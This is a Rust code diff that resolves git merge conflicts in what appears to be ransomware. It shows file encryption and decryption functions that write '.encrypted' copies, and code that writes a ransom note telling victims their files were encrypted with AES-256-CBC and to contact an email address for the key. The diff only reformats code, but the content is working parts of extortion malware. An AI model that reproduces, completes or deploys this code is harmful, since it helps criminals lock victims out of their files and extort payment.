@@ -82,7 +82,6 @@ pub fn encrypt_file(file_path: &Path, key: &[u8; 32]) -> io::Result<()> {
     file.read_to_end(&mut content)?;
 
     // Encrypt content
-<<<<<<< HEAD
     let encrypted =
         encrypt_data(&content, key).map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
 
@@ -91,19 +90,6 @@ pub fn encrypt_file(file_path: &Path, key: &[u8; 32]) -> io::Result<()> {
         "{}.encrypted",
         file_path.extension().and_then(|s| s.to_str()).unwrap_or("")
     ));
-=======
-    let encrypted = encrypt_data(&content, key)
-        .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
-
-    // Write encrypted content to new file
-    let encrypted_path = file_path.with_extension(
-        format!("{}.encrypted",
-            file_path.extension()
-                .and_then(|s| s.to_str())
-                .unwrap_or("")
-        )
-    );
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
     let mut output = fs::File::create(&encrypted_path)?;
     output.write_all(&encrypted)?;
@@ -130,13 +116,8 @@ pub fn decrypt_file(file_path: &Path, key: &[u8; 32]) -> io::Result<()> {
     file.read_to_end(&mut encrypted)?;
 
     // Decrypt content
-<<<<<<< HEAD
     let decrypted =
         decrypt_data(&encrypted, key).map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
-=======
-    let decrypted = decrypt_data(&encrypted, key)
-        .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
     // Determine original file name by removing .encrypted extension
     let original_path = PathBuf::from(
@@ -172,16 +153,10 @@ All your important files have been encrypted using AES-256-CBC.
 To decrypt your files, you need the decryption key.
 Contact EMAIL.
 
-<<<<<<< HEAD
 ⚠️  DO NOT delete encrypted files or this note.
 ⚠️  DO NOT attempt to decrypt files manually.
 "#
     ); // Only show first 16 chars for reference
-=======
-  DO NOT delete encrypted files or this note.
-  DO NOT attempt to decrypt files manually.
-"#); // Only show first 16 chars for reference
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
     let mut file = fs::File::create(&note_path)?;
     file.write_all(note_content.as_bytes())?;
